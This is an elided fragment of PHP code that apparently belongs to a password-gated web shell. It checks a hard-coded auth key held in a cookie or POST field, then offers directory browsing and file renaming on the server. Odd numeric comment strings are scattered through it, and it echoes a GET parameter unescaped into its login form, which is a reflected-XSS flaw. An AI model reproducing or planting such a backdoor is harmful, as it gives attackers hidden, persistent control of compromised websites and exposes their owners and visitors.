...
$auth_key = "b18b0c59d345866e6e5218ab0dfa94c7";
...
$pass = false;
if (isset($_COOKIE['pw_name_61011'])) {
    if(($_COOKIE['pw_name_61011']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_61011'])) {
        if(($_POST['pw_name_61011']) == $auth_key) {
            setcookie("pw_name_61011", $_POST['pw_name_61011']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_61011' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724625012448951 1724625012473507 1724625012547618 1724625012282408
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724625012448951 1724625012473507 1724625012547618 1724625012282408
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724625012448951 1724625012473507 1724625012547618 1724625012282408
            $name = PATH . "/" . $_GET['r'];
